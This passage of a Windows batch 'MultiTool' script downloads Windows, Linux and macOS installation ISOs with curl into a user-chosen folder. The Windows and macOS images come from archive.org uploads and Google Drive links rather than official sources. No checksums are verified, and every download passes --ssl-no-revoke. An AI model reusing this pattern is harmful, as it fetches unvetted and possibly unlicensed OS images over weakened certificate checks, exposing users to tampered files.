echo Windows 8.1 ISO Downloaded to %folder%
pause
goto main


:184
setlocal

set "psCommand="(new-object -COM 'Shell.Application')^
.BrowseForFolder(0,'Please choose a folder.',0,0).self.path""

chcp 437 >NUL
for /f "usebackq delims=" %%I in (`powershell %psCommand%`) do set "folder=%%I"

setlocal enabledelayedexpansion

endlocal

echo.
curl --limit-rate 0 --ssl-no-revoke -o %temp%\MultiTool\Windows7.iso https://dn720706.ca.archive.org/0/items/Windows7-iso/win7_64_bit.iso

move %temp%\MultiTool\Windows7.iso %folder%\Windows7.iso

echo.
echo Windows 7 ISO Downloaded to %folder%
pause
goto main


:185
setlocal

set "psCommand="(new-object -COM 'Shell.Application')^
.BrowseForFolder(0,'Please choose a folder.',0,0).self.path""

chcp 437 >NUL
for /f "usebackq delims=" %%I in (`powershell %psCommand%`) do set "folder=%%I"

setlocal enabledelayedexpansion

endlocal

echo.
curl --limit-rate 0 --ssl-no-revoke -o %temp%\MultiTool\WindowsXP.iso "https://drive.usercontent.google.com/download?id=1BWViZOC6GWOMf5023hmhBaYXAnZOR1yG&export=download&authuser=0&confirm=t&uuid=27c2ec69-6452-4521-aecf-e1218115f0e6&at=AIrpjvOiFFrJiWDP6g4Q-wlMigtl%3A1739705396759"

move %temp%\MultiTool\WindowsXP.iso %folder%\WindowsXP.iso

echo.
echo Windows XP ISO Downloaded to %folder%
pause
goto main


:186
setlocal

set "psCommand="(new-object -COM 'Shell.Application')^
.BrowseForFolder(0,'Please choose a folder.',0,0).self.path""

chcp 437 >NUL
for /f "usebackq delims=" %%I in (`powershell %psCommand%`) do set "folder=%%I"

setlocal enabledelayedexpansion

endlocal

echo.
curl --limit-rate 0 --ssl-no-revoke -o %temp%\MultiTool\WindowsME.iso "https://drive.usercontent.google.com/download?id=1rwQ9C7dw-pbvktk_f-_d0swf9KUF_yEZ&export=download&authuser=0&confirm=t&uuid=4d11fa1f-3cd1-41ec-a943-4b743c4a2c04&at=AIrpjvPzP-Bj9QKx2NzFpaV6HUIq%3A1739703638061"

move %temp%\MultiTool\WindowsME.iso %folder%\WindowsME.iso

echo.
echo Windows ME ISO Downloaded to %folder%
pause
goto main























REM ================================ LINUX ====================================
REM ================================ LINUX ====================================
REM ================================ LINUX ====================================


:187
setlocal

set "psCommand="(new-object -COM 'Shell.Application')^
.BrowseForFolder(0,'Please choose a folder.',0,0).self.path""

chcp 437 >NUL
for /f "usebackq delims=" %%I in (`powershell %psCommand%`) do set "folder=%%I"

setlocal enabledelayedexpansion

endlocal

echo.
curl --limit-rate 0 --ssl-no-revoke -o %temp%\MultiTool\Ubuntu.iso https://cz.releases.ubuntu.com/24.10/ubuntu-24.10-desktop-amd64.iso

move %temp%\MultiTool\Ubuntu.iso %folder%\Ubuntu.iso

echo.
echo Ubuntu ISO Downloaded to %folder%
pause
goto main


:188
setlocal

set "psCommand="(new-object -COM 'Shell.Application')^
.BrowseForFolder(0,'Please choose a folder.',0,0).self.path""

chcp 437 >NUL
for /f "usebackq delims=" %%I in (`powershell %psCommand%`) do set "folder=%%I"

setlocal enabledelayedexpansion

endlocal

echo.
curl --limit-rate 0 --ssl-no-revoke -o %temp%\MultiTool\Fedora.iso https://mirror.karneval.cz/pub/linux/fedora/linux/releases/41/Workstation/x86_64/iso/Fedora-Workstation-Live-x86_64-41-1.4.iso

move %temp%\MultiTool\Fedora.iso %folder%\Fedora.iso

echo.
echo Fedora ISO Downloaded to %folder%
pause
goto main


:189
setlocal

set "psCommand="(new-object -COM 'Shell.Application')^
.BrowseForFolder(0,'Please choose a folder.',0,0).self.path""

chcp 437 >NUL
for /f "usebackq delims=" %%I in (`powershell %psCommand%`) do set "folder=%%I"

setlocal enabledelayedexpansion

endlocal

echo.
curl --limit-rate 0 --ssl-no-revoke -o %temp%\MultiTool\PopOS.iso https://iso.pop-os.org/22.04/amd64/intel/49/pop-os_22.04_amd64_intel_49.iso

move %temp%\MultiTool\PopOS.iso %folder%\PopOS.iso

echo.
echo PopOS ISO Downloaded to %folder%
pause
goto main


:1810
setlocal

set "psCommand="(new-object -COM 'Shell.Application')^
.BrowseForFolder(0,'Please choose a folder.',0,0).self.path""

chcp 437 >NUL
for /f "usebackq delims=" %%I in (`powershell %psCommand%`) do set "folder=%%I"

setlocal enabledelayedexpansion

endlocal

echo.
curl --limit-rate 0 --ssl-no-revoke -o %temp%\MultiTool\Debian.iso https://cdimage.debian.org/debian-cd/12.9.0-live/amd64/iso-hybrid/debian-live-12.9.0-amd64-gnome.iso

move %temp%\MultiTool\Debian.iso %folder%\Debian.iso

echo.
echo Debian ISO Downloaded to %folder%
pause
goto main


:1811
setlocal

set "psCommand="(new-object -COM 'Shell.Application')^
.BrowseForFolder(0,'Please choose a folder.',0,0).self.path""

chcp 437 >NUL
for /f "usebackq delims=" %%I in (`powershell %psCommand%`) do set "folder=%%I"

setlocal enabledelayedexpansion

endlocal

echo.
curl --limit-rate 0 --ssl-no-revoke -o %temp%\MultiTool\ArchLinux.iso https://geo.mirror.pkgbuild.com/iso/2025.02.01/archlinux-2025.02.01-x86_64.iso

move %temp%\MultiTool\ArchLinux.iso %folder%\ArchLinux.iso

echo.
echo ArchLinux ISO Downloaded to %folder%
pause
goto main


:1812
setlocal

set "psCommand="(new-object -COM 'Shell.Application')^
.BrowseForFolder(0,'Please choose a folder.',0,0).self.path""

chcp 437 >NUL
for /f "usebackq delims=" %%I in (`powershell %psCommand%`) do set "folder=%%I"

setlocal enabledelayedexpansion

endlocal

echo.
curl --limit-rate 0 --ssl-no-revoke -o %temp%\MultiTool\LinuxMint.iso https://mirrors.cicku.me/linuxmint/iso/stable/22.1/linuxmint-22.1-cinnamon-64bit.iso

move %temp%\MultiTool\LinuxMint.iso %folder%\LinuxMint.iso

echo.
echo LinuxMint ISO Downloaded to %folder%
pause
goto main























REM ================================ MAC OS ====================================
REM ================================ MAC OS ====================================
REM ================================ MAC OS ====================================


:1813
setlocal

set "psCommand="(new-object -COM 'Shell.Application')^
.BrowseForFolder(0,'Please choose a folder.',0,0).self.path""

chcp 437 >NUL
for /f "usebackq delims=" %%I in (`powershell %psCommand%`) do set "folder=%%I"

setlocal enabledelayedexpansion

endlocal

echo.
curl --limit-rate 0 --ssl-no-revoke -o %temp%\MultiTool\BigSur.iso https://archive.org/download/macos_iso/BigSur_11.7.1.iso

move %temp%\MultiTool\BigSur.iso %folder%\BigSur.iso

echo.
echo BigSur ISO Downloaded to %folder%
pause
goto main


:1814
setlocal

set "psCommand="(new-object -COM 'Shell.Application')^
.BrowseForFolder(0,'Please choose a folder.',0,0).self.path""

chcp 437 >NUL
for /f "usebackq delims=" %%I in (`powershell %psCommand%`) do set "folder=%%I"

setlocal enabledelayedexpansion

endlocal

echo.
curl --limit-rate 0 --ssl-no-revoke -o %temp%\MultiTool\Catalina.iso https://archive.org/download/macos_iso/Catalina_10.15.7.iso

move %temp%\MultiTool\Catalina.iso %folder%\Catalina.iso

echo.
echo Catalina ISO Downloaded to %folder%
pause
goto main


:1815
setlocal

set "psCommand="(new-object -COM 'Shell.Application')^
.BrowseForFolder(0,'Please choose a folder.',0,0).self.path""

chcp 437 >NUL
for /f "usebackq delims=" %%I in (`powershell %psCommand%`) do set "folder=%%I"

setlocal enabledelayedexpansion

endlocal

echo.
curl --limit-rate 0 --ssl-no-revoke -o %temp%\MultiTool\HighSierra.iso https://archive.org/download/macos_iso/HighSierra_10.13.6.iso

move %temp%\MultiTool\HighSierra.iso %folder%\HighSierra.iso

echo.
echo HighSierra ISO Downloaded to %folder%
pause
goto main


:1816
setlocal

set "psCommand="(new-object -COM 'Shell.Application')^
.BrowseForFolder(0,'Please choose a folder.',0,0).self.path""

chcp 437 >NUL
for /f "usebackq delims=" %%I in (`powershell %psCommand%`) do set "folder=%%I"

setlocal enabledelayedexpansion

endlocal

echo.
curl --limit-rate 0 --ssl-no-revoke -o %temp%\MultiTool\Mojave.iso https://archive.org/download/macos_iso/Mojave_10.14.6.iso

move %temp%\MultiTool\Mojave.iso %folder%\Mojave.iso

echo.
echo Mojave ISO Downloaded to %folder%
pause
goto main


:1817
setlocal

set "psCommand="(new-object -COM 'Shell.Application')^
.BrowseForFolder(0,'Please choose a folder.',0,0).self.path""

chcp 437 >NUL
for /f "usebackq delims=" %%I in (`powershell %psCommand%`) do set "folder=%%I"

setlocal enabledelayedexpansion

endlocal

echo.
curl --limit-rate 0 --ssl-no-revoke -o %temp%\MultiTool\Monterey.iso https://archive.org/download/macos_iso/Monterey_12.6.1.iso

move %temp%\MultiTool\Monterey.iso %folder%\Monterey.iso

echo.
echo Monterey ISO Downloaded to %folder%
pause
goto main


:1818
setlocal

set "psCommand="(new-object -COM 'Shell.Application')^
.BrowseForFolder(0,'Please choose a folder.',0,0).self.path""

chcp 437 >NUL
for /f "usebackq delims=" %%I in (`powershell %psCommand%`) do set "folder=%%I"

setlocal enabledelayedexpansion

endlocal

echo.
curl --limit-rate 0 --ssl-no-revoke -o %temp%\MultiTool\Ventura.iso https://archive.org/download/macos_iso/Ventura_13.0.1.iso

move %temp%\MultiTool\Ventura.iso %folder%\Ventura.iso

echo.
echo Ventura ISO Downloaded to %folder%
pause
goto main